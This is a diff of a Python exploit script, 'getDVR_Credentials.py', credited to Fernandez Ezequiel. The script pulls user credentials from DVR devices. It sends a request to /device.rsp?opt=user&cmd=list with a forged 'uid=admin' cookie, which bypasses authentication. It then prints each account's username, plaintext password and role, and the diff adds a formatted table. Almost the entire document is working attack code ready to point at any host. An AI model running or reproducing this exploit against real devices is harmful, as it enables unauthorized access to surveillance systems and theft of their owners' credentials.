@@ -2,6 +2,7 @@
 import json
 import requests
 import argparse
+import tableprint as tp
 
 class Colors:
     BLUE        = '\033[94m'
@@ -14,16 +15,14 @@ class Colors:
     BR_COLOUR   = '\033[1;37;40m'
 
 details = ''' 
- # Exploit Title:   DVR "TBK VISION"; Credentials Exposed
- # Date:            22/12/2017
+ # Exploit Title:   DVRs; Credentials Exposed
+ # Date:            09/04/2018
  # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
- # Vendor:          TBK Vision
-
 '''
-parser = argparse.ArgumentParser(prog='**********.py',
-                                description=' [+] Obtaining all credentials ***********', 
-                                epilog='[+] Demo: python **********.py --host 192.168.1.101 -p 81',
-                                version="++++++")
+parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
+                                description=' [+] Obtaining Exposed credentials', 
+                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81',
+                                version="1.1")
 
 parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
 parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)
@@ -35,7 +34,7 @@ port    =   args.PORT
 
 headers = {}
 
-fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list" #-H "Cookie: uid=admin"
+fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
 host        =   "http://"+HST+":"+str(port)+"/"
 
 def makeReqHeaders(xCookie):
@@ -48,30 +47,47 @@ def makeReqHeaders(xCookie):
     headers["Cookie"]           = "uid="+xCookie
     return headers
 
-
 try:
     rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
 except Exception,e:
-    #print e
     print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
     exit()
 
 dataJson = json.loads(rX.text)
-totUsr = len(dataJson)   #--> 10
+totUsr = len(dataJson["list"])   #--> 10
 
-print "\n [+] Total Usuarios: "+str(totUsr)+" (?)"
-print " ======================="
+print Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN
+print " [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT
 
+print Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT
+print " "
 
+final_data = []
 try:
     for obj in range(0,totUsr):
+
+        temp = []
+
         _usuario    = dataJson["list"][obj]["uid"]
         _password   = dataJson["list"][obj]["pwd"]
         _role       = dataJson["list"][obj]["role"]
-        print " [+] "+_usuario + " : " + str(_password) +" (Rol: "+str(_role) +" )"
+
+        temp.append(_usuario) 
+        temp.append(_password)
+        temp.append(_role)
+
+        final_data.append(temp)
+
+        hdUsr = Colors.GREEN+"Username"+Colors.DEFAULT
+        hdPass = Colors.GREEN+"Password"+Colors.DEFAULT
+        hdRole = Colors.GREEN+"Role ID"+Colors.DEFAULT
+
+        cabeceras = [hdUsr, hdPass, hdRole] 
+
+    tp.table(final_data, cabeceras, width=20)
+
 except Exception, e:
     print "\n [!]: "+str(e)
-    #print " [+] "+ str(dataJson)
+    print " [+] "+ str(dataJson)
 
- 
 print "\n"
